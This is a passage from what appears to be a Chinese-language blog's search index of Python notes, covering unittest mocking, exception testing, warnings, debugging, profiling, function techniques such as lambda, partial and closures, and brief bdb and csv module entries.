'{}://{}.{}'.format(protocol, host, domain)\n  print(url) 使用unitetest相关工具测试: from io import StringIO\nfrom unittest import TestCase\nfrom unittest.mock import patch\nimport mymodule\n\nclass TestURLPrint(TestCase):\n\n  def test_url_gets_to_stdout(self):\n    protocol = 'http'\n    host = 'www'\n    domain = 'example.com'\n    expected_url = '{}://{}.{}\\n'.format(protocol, host, domain)\n\n    with patch('sys.stdout', new=StringIO()) as fake_out:\n      mymodule.urlprint(protocol, host, domain)\n      self.assertEqual(fake_out.getvalue(), expected_url) 讨论 urlprint() 函数接受三个参数，测试方法开始会先设置每一个参数的值。\nexpected_url 变量被设置成包含期望的输出的字符串。 unittest.mock.patch() 函数被用作一个上下文管理器，使用 StringIO 对象来代\n替 sys.stdout . fake_out 变量是在该进程中被创建的模拟对象。在 with 语句中使用\n它可以执行各种检查。当 with 语句结束时，patch 会将所有东西恢复到测试开始前的\n状态。有一点需要注意的是某些对 Python 的 C 扩展可能会忽略掉 sys.stdout 的配\n置二直接写入到标准输出中。限于篇幅，本节不会涉及到这方面的讲解，它适用于纯\nPython 代码。如果你真的需要在 C 扩展中捕获 I/O，你可以先打开一个临时文件，然\n后将标准输出重定向到该文件中。 在单元测试中给对象打补丁 问题 你写的单元测试中需要给指定的对象打补丁，用来断言它们在测试中的期望行为\n（比如，断言被调用时的参数个数，访问指定的属性等）。 解决方案 unittest.mock.patch() 函数可被用来解决这个问题。patch() 还可被用作一个\n装饰器、上下文管理器或单独使用，尽管并不常见。例如，下面是一个将它当做装饰器\n使用的例子: from unittest.mock import patch\nimport example\n\n@patch('example.func')\ndef test1(x, mock_func):\n  example.func(x) # Uses patched example.func\n  mock_func.assert_called_with(x) 它还可以被当做一个上下文管理器: with patch('example.func') as mock_func:\n  example.func(x) # Uses patched example.func\n  mock_func.assert_called_with(x) 最后，你还可以手动的使用它打补丁: p = patch('example.func')\nmock_func = p.start()\nexample.func(x)\nmock_func.assert_called_with(x)\np.stop() 如果可能的话，你能够叠加装饰器和上下文管理器来给多个对象打补丁 讨论 patch() 接受一个已存在对象的全路径名，将其替换为一个新的值。原来的值会在\n装饰器函数或上下文管理器完成后自动恢复回来。默认情况下，所有值会被 MagicMock\n实例替代。例如: >>> x = 42\n>>> with patch('__main__.x'):\n...   print(x)\n...\n<MagicMock name='x' id='4314230032'>\n>>> x\n42\n>>> 不过，你可以通过给 patch() 提供第二个参数来将值替换成任何你想要的: >>> x\n42\n>>> with patch('__main__.x', 'patched_value'):\n...   print(x)\n...\npatched_value\n>>> x\n42\n>>> 被用来作为替换值的 MagicMock 实例能够模拟可调用对象和实例。他们记录对象\n的使用信息并允许你执行断言检查， 在单元测试中测试异常情况 问题 你想写个测试用例来准确的判断某个异常是否被抛出。 解决方案 对于异常的测试可使用 assertRaises() 方法。 讨论 assertRaises() 方法为测试异常存在性提供了一个简便方法。一个常见的陷阱是\n手动去进行异常检测。 比如: class TestConversion(unittest.TestCase):\n\n  def test_bad_int(self):\n    try:\n      r = parse_int('N/A')\n    except ValueError as e:\n      self.assertEqual(type(e), ValueError) 这种方法的问题在于它很容易遗漏其他情况，比如没有任何异常抛出的时候。那么\n你还得需要增加另外的检测过程，如下面这样: class TestConversion(unittest.TestCase):\n\n  def test_bad_int(self):\n\n    try:\n      r = parse_int('N/A')\n    except ValueError as e:\n      self.assertEqual(type(e), ValueError)\n    else:\n      self.fail('ValueError not raised') assertRaises() 方法会处理所有细节，因此你应该使用它。 assertRaises() 的一个缺点是它测不了异常具体的值是多少。为了测试异常值，\n可以使用 assertRaisesRegex() 方法，它可同时测试异常的存在以及通过正则式匹配\n异常的字符串表示。 assertRaises() 和 assertRaisesRegex() 还有一个容易忽略的地方就是它们还\n能被当做上下文管理器使用: class TestConversion(unittest.TestCase):\n  def test_bad_int(self):\n    with self.assertRaisesRegex(ValueError, 'invalid literal .*'):\n      r = parse_int('N/A') 将测试输出用日志记录到文件中 问题 你希望将单元测试的输出写到到某个文件中去，而不是打印到标准输出。 解决方案 运行单元测试一个常见技术就是在测试文件底部加入下面这段代码片段: import unittest\n\nclass MyTest(unittest.TestCase):\n  pass\n\nif __name__ == '__main__':\n  unittest.main() 这样的话测试文件就是可执行的，并且会将运行测试的结果打印到标准输出上。如\n果你想重定向输出，就需要像下面这样修改 main() 函数: import sys\n\ndef main(out=sys.stderr, verbosity=2):\n  loader = unittest.TestLoader()\n  suite = loader.loadTestsFromModule(sys.modules[__name__])\n  unittest.TextTestRunner(out,verbosity=verbosity).run(suite)\n\nif __name__ == '__main__':\n  with open('testing.out', 'w') as f:\n    main(f) 讨论 本节感兴趣的部分并不是将测试结果重定向到一个文件中，而是通过这样做向你\n展示了 unittest 模块中一些值得关注的内部工作原理。 忽略或期望测试失败 处理多个异常 捕获所有异常 想要捕获所有的异常，可以直接捕获 Exception 将会捕获除了 SystemExit 、KeyboardInterrupt 和 GeneratorExit 之外的\n所有异常。如果你还想捕获这三个异常，将 Exception 改成 BaseException 即可 应该尽可能将异常处理器定义的精准一些。 创建自定义异常 自定义异常类应该总是继承自内置的 Exception 类，或者是继承自那些本身就是\n从 Exception 继承而来的类。 捕获异常后抛出另外的异常 问题 你想捕获一个异常后抛出另外一个不同的异常，同时还得在异常回溯中保留两个\n异常的信息。 解决方案 为了链接异常，使用 raise from 语句来代替简单的 raise 语句。它会让你同时保\n留两个异常的信息。例如: >>> def example():\n...   try:\n...     int('N/A')\n...   except ValueError as e:\n...     raise RuntimeError('A parsing error occurred') from e\n...\n>>> example()\nTraceback (most recent call last):\n  File \"<stdin>\", line 3, in example\nValueError: invalid literal for int() with base 10: 'N/A'\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"<stdin>\", line 5, in example\nRuntimeError: A parsing error occurred\n>>> 如果，你想忽略掉异常链，可使用 raise from None 讨论 在设计代码时，在另外一个 except 代码块中使用 raise 语句的时候你要特别小心\n了。大多数情况下，这种 raise 语句都应该被改成 raise from 语句。也就是说你应该\n使用下面这种形式: try:\n  ...\nexcept SomeException as e:\n  raise DifferentException() from e 这样做的原因是你应该显示的将原因链接起来。也就是说，DifferentException\n是直接从 SomeException 衍生而来。这种关系可以从回溯结果中看出来。 重新抛出被捕获的异常 简单的使用一个单独的 rasie 语句即可 输出警告信息 使用 warning.warn() 函数 warn() 的参数是一个警告消息和一个警告类，警告类有如下几种： UserWarning DeprecationWarning SyntaxWarning RuntimeWarning ResourceWarning FutureWarning. 对警告的处理取决于你如何运行解释器以及一些其他配置。例如，如果你使用 -W\nall 选项去运行 Python，你会得到如下的输出: bash % python3 -W all example.py\nexample.py:5: DeprecationWarning: logfile argument is deprecated\nwarnings.warn('logfile argument is deprecated', DeprecationWarning) 通常来讲，警告会输出到标准错误上。如果你想讲警告转换为异常，可以使用 -W error 选项: bash % python3 -W error example.py\nTraceback (most recent call last):\nFile \"example.py\", line 10, in <module>\nfunc(2, 3, logfile='log.txt')\nFile \"example.py\", line 5, in func\nwarnings.warn('logfile argument is deprecated', DeprecationWarning)\nDeprecationWarning: logfile argument is deprecated\nbash % 默认情况下，并不是所有警告消息都会出现. -W 选项能控制警告消息的输出. -W all 会输出所有警告消息 -W ignore 忽略掉所有警告 -W error 将警告转换成异常 另外一种选择，你还可以使用 warnings.simplefilter() 函数控制输出: always 参数会让所有警告消息出现 ignore 忽略调所有的警告 error 将警告转换成异常。 调试基本的程序崩溃错误 使用: python3 -i sample.py 在执行结束时打开交互式窗口查看环境 也可以在程序崩溃后打开 Python 的调试器。例如: >>> import pdb\n>>> pdb.pm()\n> sample.py(4)func()\n-> return n + 10\n(Pdb) w\nsample.py(6)<module>()\n-> func('Hello')\n> sample.py(4)func()\n-> return n + 10\n(Pdb) print n\n'Hello'\n(Pdb) q\n>>> 如果你的代码所在的环境很难获取交互 shell（比如在某个服务器上面），通常可以\n捕获异常后自己打印跟踪信息。例如: import traceback\nimport sys\n\ntry:\n  func(arg)\nexcept:\n  print('**** AN ERROR OCCURRED ****')\n  traceback.print_exc(file=sys.stderr) 要是你的程序没有崩溃，而只是产生了一些你看不懂的结果，你在感兴趣的地方插\n入一下 print() 语句也是个不错的选择。不过，要是你打算这样做，有一些小技巧可\n以帮助你。首先，traceback.print_stack() 函数会你程序运行到那个点的时候创建\n一个跟踪栈。 可使用 pdb.set_trace() 在任何地方手动的启动调试器 给你的程序做性能测试 问题\n·你想测试你的程序运行所花费的时间并做性能测试。 解决方案 如果你只是简单的想测试下你的程序整体花费的时间，通常使用 Unix 时间函数time就\n行了: bash % time python3 someprogram.py\nreal 0m13.937s\nuser 0m12.162s\nsys 0m0.098s\nbash % 如果你还需要一个程序各个细节的详细报告，可以使用 cProfile 模块: bash % python3 -m cProfile someprogram.py\n859647 function calls in 16.016 CPU seconds\nOrdered by: standard name\nncalls tottime percall cumtime percall filename:lineno(function)\n263169 0.080 0.000 0.080 0.000 someprogram.py:16(frange)\n513 0.001 0.000 0.002 0.000 someprogram.py:30(generate_\n,\n→mandel)\n262656 0.194 0.000 15.295 0.000 someprogram.py:32(<genexpr>) 1 0.036 0.036 16.077 16.077 someprogram.py:4(<module>)\n262144 15.021 0.000 15.021 0.000 someprogram.py:4(in_mandelbrot)\n1 0.000 0.000 0.000 0.000 os.py:746(urandom)\n1 0.000 0.000 0.000 0.000 png.py:1056(_readable)\n1 0.000 0.000 0.000 0.000 png.py:1073(Reader)\n1 0.227 0.227 0.438 0.438 png.py:163(<module>)\n512 0.010 0.000 0.010 0.000 png.py:200(group)\n...\nbash % 不过通常情况是介于这两个极端之间。比如你已经知道代码运行时在少数几个函\n数中花费了绝大部分时间。对于这些函数的性能测试，可以使用一个简单的装饰器: start = time.perf_counter()\nr = func(*args, **kwargs)\nend = time.perf_counter() 对于测试很小的代码片段运行性能，使用 timeit 模块会很方便，例如: >>> from timeit import timeit\n>>> timeit('math.sqrt(2)', 'import math')\n0.1432319980012835\n>>> timeit('sqrt(2)', 'from math import sqrt')\n0.10836604500218527\n>>> timeit 会执行第一个参数中语句 100 万次并计算运行时间。第二个参数是运行测\n试之前配置环境。如果你想改变循环执行次数，可以像下面这样设置 number 参数的值: >>> timeit('math.sqrt(2)', 'import math', number=10000000)\n1.434852126003534\n>>> timeit('sqrt(2)', 'from math import sqrt', number=10000000)\n1.0270336690009572\n>>> 讨论 当执行性能测试的时候，需要注意的是你获取的结果都是近似值。time.\nperf_counter() 函数会在给定平台上获取最高精度的计时值。不过，它仍然还是\n基于时钟时间，很多因素会影响到它的精确度，比如机器负载。如果你对于执行时间更\n感兴趣，使用 time.process_time() 来代替它。 最后，如果你想进行更深入的性能分析，那么你需要详细阅读 time 、timeit 和其\n他相关模块的文档。这样你可以理解和平台相关的差异以及一些其他陷阱。 加速程序运行 问题 你的程序运行太慢，你想在不使用复杂技术比如 C 扩展或 JIT 编译器的情况下加\n快程序运行速度。 解决方案 关于程序优化的第一个准则是\"不要优化\"，第二个准则是\"不要优化那些无关紧\n要的部分\"。如果你的程序运行缓慢，首先你得使用上一节的技术先对它进行性能\n测试找到问题所在。 通常来讲你会发现你得程序在少数几个热点地方花费了大量时间，比如内存的数\n据处理循环。一旦你定位到这些点，你就可以使用下面这些实用技术来加速程序运行: 使用函数代替全局代码, 这是因为定义在全局范围的代码运行起来要比定义在函数中运行慢\n的多。这种速度差异是由于局部变量和全局变量的实现方式（使用局部变量要更快些） 尽可能去掉属性访问. 每一次使用点 (.) 操作符来访问属性的时候会带来额外的开销。\n它会触发特定的方法，比如 __getattribute__() 和 __getattr__() ，\n这些方法会进行字典操作操作. (主要是使用导入的模块吧) 理解局部变量, 例如实例函数内, 一开始就将self.value赋值给value(局部变量) 避免不必要的抽象. 任何时候当你使用额外的处理层（比如装饰器、属性访问、描述器）去包装你的代\n码时，都会让程序运行变慢。 使用内置的容器. 内置的数据类型比如字符串、元组、列表、集合和字典都是使用 C 来实现的，运\n行起来非常快。如果你想自己实现新的数据结构（比如链接列表、平衡树等），那么要\n想在性能上达到内置的速度几乎不可能 避免创建不必要的数据结构或复制. 讨论 在优化之前，有必要先研究下使用的算法。选择一个复杂度为 O(n log n) 的算法\n要比你去调整一个复杂度为 O(n**2) 的算法所带来的性能提升要大得多。 如果你觉得你还是得进行优化，那么请从整体考虑。作为一般准则，不要对程序的\n每一个部分都去优化, 因为这些修改会导致代码难以阅读和理解。你应该专注于优化产\n生性能瓶颈的地方，比如内部循环。 你还要注意微小优化的结果。例如考虑下面创建一个字典的两种方式: a = {'name' : 'AAPL', 'shares' : 100, 'price' : 534.22}\nb = dict(name='AAPL', shares=100, price=534.22) 后面一种写法更简洁一些（你不需要在关键字上输入引号）。不过，如果你将这两\n个代码片段进行性能测试对比时，会发现使用 dict() 的方式会慢了 3 倍。看到这个，\n你是不是有冲动把所有使用 dict() 的代码都替换成第一种。不够，聪明的程序员只会\n关注他应该关注的地方，比如内部循环。在其他地方，这点性能损失没有什么影响。 最后我引用 John Ousterhout 说过的话作为结尾：\"最好的性能优化是从不工作到\n工作状态的迁移\"。直到你真的需要优化的时候再去考虑它。确保你程序正确的运行通\n常比让它运行更快要更重要一些（至少开始是这样的）","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-Test,-debug-and-abnormal.html","loc":"/yq-docs-rear-end-python-cookbook-Test,-debug-and-abnormal.html"},{"title":"函数","text":"使用 def 语句定义函数是所有程序的基础。本章的目标是讲解一些更加高级和不\n常见的函数定义与使用模式。涉及到的内容包括默认参数、任意数量参数、强制关键字\n参数、注解和闭包。另外，一些高级的控制流和利用回调函数传递数据的技术在这里也\n会讲解到。 可接受任意数量参数的函数 接受任意数量的位置参数, 使用 * def avg(first, *rest):\n  return (first + sum(rest)) / (1 + len(rest))\n\n# Sample use\navg(1, 2) # 1.5\navg(1, 2, 3, 4) # 2.5 接受任意数量的关键字参数，使用一个以 ** def make_element(name, value, **attrs): ... 位置参数实际是元组 关键字参数实际是字典 一起用: def anyargs(*args, **kwargs): ... 一个 * 参数只能出现在函数定义中最后一个位置参数后面，而 ** 参数只能出现在\n最后一个参数。有一点要注意的是，在 * 参数后面仍然可以定义其他参数: def a(x, *args, y): ...\n\ndef b(x, *args, y, **kwargs): ... 即 强制关键字参数. 只接受关键字参数的函数 希望函数的某些参数强制使用关键字参数传递 将强制关键字参数放到某个 * 参数或者单个 * 后面就能达到这种效果: def recv(maxsize, *, block):\n  'Receives a message'\n  pass\n\nrecv(1024, True) # TypeError\nrecv(1024, block=True) # Ok 给函数参数增加元信息 你写好了一个函数，然后想为这个函数的参数增加一些额外的信息，这样的话其他\n使用者就能清楚的知道这个函数应该怎么使用。 使用函数参数注解: def add(x:int, y:int) -> int:\n  return x + y python 解释器不会对这些注解添加任何的语义。它们不会被类型检查，运行时跟\n没有加注解之前的效果也没有任何差距。然而，对于那些阅读源码的人来讲就很有帮助\n啦。第三方工具和框架可能会对这些注解添加语义。同时它们也会出现在文档中。 函数注解只存储在函数的 __annotations__ 属性中 返回多个值的函数 函数直接 return 一个元组就行: def myfun():\n  return 1, 2, 3 看上去返回了多个值，实际上是先创建了一个元组然后返回的。这\n个语法看上去比较奇怪，实际上我们使用的是逗号来生成一个元组，而不是用括号. 定义有默认参数的函数 定义一个函数或者方法，它的一个或多个参数是可选的并且有一个默认值 直接在函数定义中给参数指定一个默\n认值，并放到参数列表最后就行了: def spam(a, b=42):\n  print(a, b) 如果默认参数是一个可修改的容器比如一个列表、集合或者字典，可以使用 None\n作为默认值: # Using a list as a default value\ndef spam(a, b=None):\n  if b is None: b = [] 如果你并不想提供一个默认值，而是想仅仅测试下某个默认参数是不是有传递进\n来，可以像下面这样写: _no_value = object()\n\ndef spam(a, b=_no_value):\n  if b is _no_value:\n    print('No b value supplied') 测试: >>> spam(1)\nNo b value supplied\n>>> spam(1, 2) # b = 2\n>>> spam(1, None) # b = None\n>>> 仔细观察可以发现到传递一个 None 值和不传值两种情况是有差别的。 默认参数的值仅仅在函数定义的时候赋值一次: >>> x = 42\n>>> def spam(a, b=x):\n... print(a, b)\n...\n>>> spam(1)\n1 42\n>>> x = 23 # Has no effect\n>>> spam(1)\n1 42\n>>> 默认参数的值应该是不可变的对象，比如 None、True、False、数字或字符\n串。 最后一个问题比较微妙，那就是一个函数需要测试某个可选参数是否被使用者传\n递进来。这时候需要小心的是你不能用某个默认值比如 None、0 或者 False 值来测试用\n户提供的值 (因为这些值都是合法的值，是可能被用户传递进来的)。因此，你需要其他\n的解决方案了。 为了解决这个问题，你可以创建一个独一无二的私有对象实例，就像上面的\n_no_value 变量那样。在函数里面，你可以通过检查被传递参数值跟这个实例是否一样\n来判断。这里的思路是用户不可能去传递这个 _no_value 实例作为输入。因此，这里\n通过检查这个值就能确定某个参数是否被传递进来了。 定义匿名或内联函数 你想为 sort() 操作创建一个很短的回调函数，但又不想用 def 去写一个单行函\n数，而是希望通过某个快捷方式以内联方式来创建这个函数。 以使用 lambda 表达式: >>> add = lambda x, y: x + y\n>>> add(2,3) 5\n>>> add('hello', 'world')\n'helloworld'\n>>> 尽管 lambda 表达式允许你定义简单函数，但是它的使用是有限制的。你只能指定\n单个表达式，它的值就是最后的返回值。也就是说不能包含其他的语言特性了，包括多\n个语句、条件表达式、迭代以及异常处理等等。 匿名函数捕获变量值 用 lambda 定义了一个匿名函数，并想在定义时捕获到某些变量的值。 lambda 表达式中的 x 是一个自由变量，在运行时绑定值，而不\n是定义时就绑定，这跟函数的默认值参数定义是不同的。因此，在调用这个 lambda 表\n达式的时候，x 的值是执行时的值: >>> x = 10\n>>> a = lambda y: x + y\n>>> x = 20\n>>> b = lambda y: x + y\n>>>\n>>> a(10)\n30\n>>> b(10)\n30\n>>> 如果你想让某个匿名函数在定义时就捕获到值，可以将那个参数值定义成默认参\n数即可，就像下面这样: >>> x = 10\n>>> a = lambda y, x=x: x + y\n>>> x = 20\n>>> b = lambda y, x=x: x + y\n>>> a(10)\n20\n>>> b(10)\n30\n>>> 在这里列出来的问题是新手很容易犯的错误，有些新手可能会不恰当的使用\nlambda 表达式。比如，通过在一个循环或列表推导中创建一个 lambda 表达式列表，并\n期望函数能在定义时就记住每次的迭代值。例如: >>> funcs = [lambda x: x+n for n in range(5)]\n>>> for f in funcs:\n...   print(f(0))\n...\n4\n4\n4\n4\n4\n>>> 但是实际效果是运行是 n 的值为迭代的最后一个值。现在我们用另一种方式修改\n一下: >>> funcs = [lambda x, n=n: x+n for n in range(5)]\n>>> for f in funcs:\n...   print(f(0))\n...\n0\n1\n2\n3\n4\n>>> 通过使用函数默认值参数形式，lambda 函数在定义时就能绑定到值。 减少可调用对象的参数个数 你有一个被其他 python 代码使用的 callable 对象，可能是一个回调函数或者是一\n个处理器，但是它的参数太多了，导致调用时出错。 如果需要减少某个函数的参数个数，你可以使用 functools.partial() 。partial()\n函数允许你给一个或多个参数设置固定的值，减少接下来被调用时的参数个数。为了演\n示清楚，假设你有下面这样的函数: def spam(a, b, c, d):\n  print(a, b, c, d) 使用 partial() 函数来固定某些参数值: >>> from functools import partial\n>>> s1 = partial(spam, 1) # a = 1\n>>> s1(2, 3, 4)\n1 2 3 4\n>>> s1(4, 5, 6)\n1 4 5 6\n>>> s2 = partial(spam, d=42) # d = 42\n>>> s2(1, 2, 3)\n1 2 3 42\n>>> s2(4, 5, 5)\n4 5 5 42\n>>> s3 = partial(spam, 1, 2, d=42) # a = 1, b = 2, d = 42\n>>> s3(3)\n1 2 3 42\n>>> s3(4)\n1 2 4 42\n>>> s3(5)\n1 2 5 42\n>>> 可以看出 partial() 固定某些参数并返回一个新的 callable 对象。这个新的 callable\n接受未赋值的参数，然后跟之前已经赋值过的参数合并起来，最后将所有参数传递给原\n始函数。 本节要解决的问题是让原本不兼容的代码可以一起工作。下面我会列举一系列的\n例子。 第一个例子是，假设你有一个点的列表来表示 (x,y) 坐标元组。你可以使用下面的\n函数来计算两点之间的距离: points = [ (1, 2), (3, 4), (5, 6), (7, 8) ]\nimport math\ndef distance(p1, p2):\n  x1, y1 = p1\n  x2, y2 = p2\n  return math.hypot(x2 - x1, y2 - y1) 现在假设你想以某个点为基点，根据点和基点之间的距离来排序所有的这些点。列\n表的 sort() 方法接受一个关键字参数来自定义排序逻辑，但是它只能接受一个单个参\n数的函数 (distance() 很明显是不符合条件的)。现在我们可以通过使用 partial() 来解\n决这个问题: >>> pt = (4, 3)\n>>> points.sort(key=partial(distance,pt))\n>>> points\n[(3, 4), (1, 2), (5, 6), (7, 8)]\n>>> 将单方法的类转换为函数 有一个除 __init__() 方法外只定义了一个方法的类。为了简化代码，你想将它\n转换成一个函数 大多数情况下，可以使用闭包来将单个方法的类转换成函数。举个例子，下面示例\n中的类允许使用者根据某个模板方案来获取到 URL 链接地址: from urllib.request import urlopen\n\nclass UrlTemplate:\n  def __init__(self, template):\n    self.template = template\n\n  def open(self, **kwargs):\n    return urlop 这个类可以被一个更简单的函数来代替: def urltemplate(template):\n  def opener(**kwargs):\n    return urlopen(template.format_map(kwargs))\n  return opener 大部分情况下，你拥有一个单方法类的原因是需要存储某些额外的状态来给方法\n使用。比如，定义 UrlTemplate 类的唯一目的就是先在某个地方存储模板值，以便将来\n可以在 open() 方法中使用。 使用一个内部函数或者闭包的方案通常会更优雅一些。简单来讲，一个闭包就是\n一个函数，只不过在函数内部带上了一个额外的变量环境。闭包关键特点就是它会记\n住自己被定义时的环境。因此，在我们的解决方案中，opener() 函数记住了 template\n参数的值，并在接下来的调用中使用它。 任何时候只要你碰到需要给某个函数增加额外的状态信息的问题，都可以考虑使\n用闭包。相比将你的函数转换成一个类而言，闭包通常是一种更加简洁和优雅的方案。 带额外状态信息的回调函数 你的代码中需要依赖到回调函数的使用 (比如事件处理器、等待后台任务完成后的\n回调等)，并且你还需要让回调函数拥有额外的状态值，以便在它的内部使用到。 主要讨论的是那些出现在很多函数库和框架中的回调函数的使用——特\n别是跟异步处理有关的。为了演示与测试，我们先定义如下一个需要调用回调函数的函\n数: def apply_async(func, args, *, callback):\n  # Compute the result\n  result = func(*args)\n  # Invoke the callback with the result\n  callback(result) 使用: >>> def print_result(result):\n...   print('Got:', result)\n...\n>>> def add(x, y):\n...   return x + y\n...\n>>> apply_async(add, (2, 3), callback=print_result)\nGot: 5\n>>> apply_async(add, ('hello', 'world'), callback=print_result)\nGot: helloworld\n>>> 使用一个闭包捕获状态值: def make_handler():\n  sequence = 0\n\ndef handler(result):\n  nonlocal sequence\n  sequence += 1\n  print('[{}] Got: {}'.format(sequence, result))\n  return handler 使用: >>> handler = make_handler()\n>>> apply_async(add, (2, 3), callback=handler)\n[1] Got: 5\n>>> apply_async(add, ('hello', 'world'), callback=handler)\n[2] Got: helloworld\n>>> 还有另外一个更高级的方法，可以使用协程来完成同样的事情: def make_handler():\n  sequence = 0\n  while True:\n    result = yield\n    sequence += 1\n    print('[{}] Got: {}'.format(sequence, result)) 对于协程，你需要使用它的 send() 方法作为回调函数，如下所示: >>> handler = make_handler()\n>>> next(handler) # Advance to the yield\n>>> apply_async(add, (2, 3), callback=handler.send)\n[1] Got: 5\n>>> apply_async(add, ('hello', 'world'), callback=handler.send)\n[2] Got: helloworld\n>>> 基于回调函数的软件通常都有可能变得非常复杂。一部分原因是回调函数通常会\n跟请求执行代码断开。因此，请求执行和处理结果之间的执行环境实际上已经丢失了。\n如果你想让回调函数连续执行多步操作，那你就必须去解决如何保存和恢复相关的状\n态信息了。 至少有两种主要方式来捕获和保存状态信息，你可以在一个对象实例 (通过一个绑\n定方法) 或者在一个闭包中保存它。两种方式相比，闭包或许是更加轻量级和自然一点，\n因为它们可以很简单的通过函数来构造。它们还能自动捕获所有被使用到的变量。因\n此，你无需去担心如何去存储额外的状态信息 (代码中自动判定)。 如果使用闭包，你需要注意对那些可修改变量的操作。在上面的方案中，nonlocal\n声明语句用来指示接下来的变量会在回调函数中被修改。如果没有这个声明，代码会报\n错 而使用一个协程来作为一个回调函数就更有趣了，它跟闭包方法密切相关。某种意\n义上来讲，它显得更加简洁，因为总共就一个函数而已。并且，你可以很自由的修改变\n量而无需去使用 nonlocal 声明。这种方式唯一缺点就是相对于其他 Python 技术而言\n或许比较难以理解。另外还有一些比较难懂的部分，比如使用之前需要调用 next() ，\n实际使用时这个步骤很容易被忘记。尽管如此，协程还有其他用处，比如作为一个内联\n回调函数的定义 如果你仅仅只需要给回调函数传递额外的值的话，还有一种使用 partial() 的方\n式也很有用。在没有使用 partial() 的时候，你可能经常看到下面这种使用 lambda 表\n达式的复杂代码: >>> apply_async(add, (2, 3), callback=lambda r: handler(r, seq))\n[1] Got: 5\n>>> 内联回调函数 当你编写使用回调函数的代码的时候，担心很多小函数的扩张可能会弄乱程序控\n制流。你希望找到某个方法来让代码看上去更像是一个普通的执行序列。 通过使用生成器和协程可以使得回调函数内联在某个函数中\n假设你有如下所示的一个执行某种计算任务然后调用一个回调函数的函数: def apply_async(func, args, *, callback):\n  # Compute the result\n  result = func(*args)\n\n  # Invoke the callback with the result\n  callback(result) 接下来让我们看一下下面的代码，它包含了一个 Async 类和一个 inlined_async\n装饰器: from queue import Queue\nfrom functools import wraps\n\nclass Async:\n  def __init__(self, func, args):\n    self.func = func\n    self.args = args\n\ndef inlined_async(func):\n  @wraps(func)\n  def wrapper(*args):\n    f = func(*args)\n    result_queue = Queue()\n    result_queue.put(None)\n    while True:\n      result = result_queue.get()\n      try:\n        a = f.send(result)\n        apply_async(a.func, a.args, callback=result_queue.put)\n      except StopIteration:\n        break\n  return wrapper 这两个代码片段允许你使用 yield 语句内联回调步骤。比如: def add(x, y):\n  return x + y\n\n@inlined_async\ndef test():\n  r = yield Async(add, (2, 3))\n  print(r)\n  r = yield Async(add, ('hello', 'world'))\n  print(r)\n  for n in range(10):\n    r = yield Async(add, (n, n))\n    print(r)\n  print('Goodbye') 如果你调用 test() ，你会得到类似如下的输出: 5\nhelloworld\n0\n2468\n10\n12\n14\n16\n18\nGoodbye 你会发现，除了那个特别的装饰器和 yield 语句外，其他地方并没有出现任何的\n回调函数 (其实是在后台定义的) 关于回调函数、生成器和控制流 在需要使用到回调的代码中，关键点在于当前计算工作会挂起并在将来\n的某个时候重启 (比如异步执行)。当计算重启时，回调函数被调用来继续处理结果。\napply_async() 函数演示了执行回调的实际逻辑，尽管实际情况中它可能会更加复杂\n(包括线程、进程、事件处理器等等)。 计算的暂停与重启思路跟生成器函数的执行模型不谋而合。具体来讲，yield 操作\n会使一个生成器函数产生一个值并暂停。接下来调用生成器的 __next__() 或 send()\n方法又会让它从暂停处继续执行。 访问闭包中定义的变量 想要扩展函数中的某个闭包，允许它能访问和修改函数的内部变量 通常来讲，闭包的内部变量对于外界来讲是完全隐藏的。但是，你可以通过编写访\n问函数并将其作为函数属性绑定到闭包上来实现这个目的。例如: def sample():\nn = 0\n# Closure function\ndef func():\n  print('n=', n)\n\n# Accessor methods for n\ndef get_n():\n  return n\n\ndef set_n(value):\n  nonlocal n\n  n = value\n\n# Attach as function attributes\nfunc.get_n = get_n\nfunc.set_n = set_n\nreturn func 使用: >>> f = sample()\n>>> f()\nn= 0\n>>> f.set_n(10)\n>>> f()\nn= 10\n>>> f.get_n()\n10\n>>> 为了说明清楚它如何工作的，有两点需要解释一下。首先，nonlocal 声明可以让\n我们编写函数来修改内部变量的值。其次，函数属性允许我们用一种很简单的方式将访\n问方法绑定到闭包函数上，这个跟实例方法很像 (尽管并没有定义任何类)。","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-function.html","loc":"/yq-docs-rear-end-python-cookbook-function.html"},{"title":"分类","text":"模版校验 configparser 网络编程 socket socketserver ssl","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-.Classification.html","loc":"/yq-docs-rear-end-python-python-standard-library-.Classification.html"},{"title":"bdb","text":"官网: https://docs.python.org/zh-cn/3/library/bdb.html 调试器框架. 模块处理基本的调试器函数，例如设置断点或通过调试器来管理执行。 简单介绍部分 class bdb.Bdb(skip=None) 通用的 Python 调试器基类. 比如pdb","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-BDB.html","loc":"/yq-docs-rear-end-python-python-standard-library-BDB.html"},{"title":"csv","text":"官网: csv - CSV 文件读写 CSV (Comma Separated Values) 格式是电子表格和数据库中最常见的输入、输出文件格式。 csv 模块实现了 CSV 格式表单数据的读写。\n其提供了诸如\"以兼容 Excel 的方式输出数据文件\"或\"读取 Excel 程序输出的数据文件\"的功能，\n程序员无需知道 Excel 所采用 CSV 格式的细节。\n此模块同样可以用于定义其他应用程序可用的 CSV 格式或定义特定需求的 CSV 格式。 csv 模块中的 reader 类和 writer 类可用于读写序列化的数据。\n也可使用 DictReader 类和 DictWriter 类以字典的形式读写数据。 提供的函数 csv.reader(csvfile, dialect='excel', **fmtparams) 返回一个 reader 对象，该对象将逐行遍历 csvfile。\ncsvfile 可以是任何对象，只要这个对象支持 iterator 协议并在每次调用 __next__() 方法时都返回字符串，\n文件对象 和列表对象均适用。 csvfile: 如果 csvfile 是文件对象，则打开它时应使用 newline='' 。\n如果没有指定 newline=''，则嵌入引号中的换行符将无法正确解析，\n并且在写入时，使用 \\r\\n 换行的平台会有多余的 \\r 写入。\n由于 csv 模块会执行自己的（通用）换行符处理，因此指定 newline='' 应该总是安全的。 dialect: 可选参数 dialect 是用于不同的 CSV 变种的特定参数组。它可以是 Dialect 类的子类的实例，\n也可以是 list_dialects() 函数返回的字符串之一。 fmtparams: 另一个可选关键字参数 fmtparams 可以覆写当前变种格式中的单个格式设置。有关变种和格式设置参数的完整详细信息，\n请参见 变种与格式参数 部分。 csv 文件的每一行都读取为一个由字符串组成的列表。除非指定了 QUOTE_NONNUMERIC 格式选项（在这种情况下，未加引号的字段会转换为浮点数），否则不会执行自动数据类型转换。 一个简短的用法示例: >>>\nimport csv\nwith open('eggs.csv', 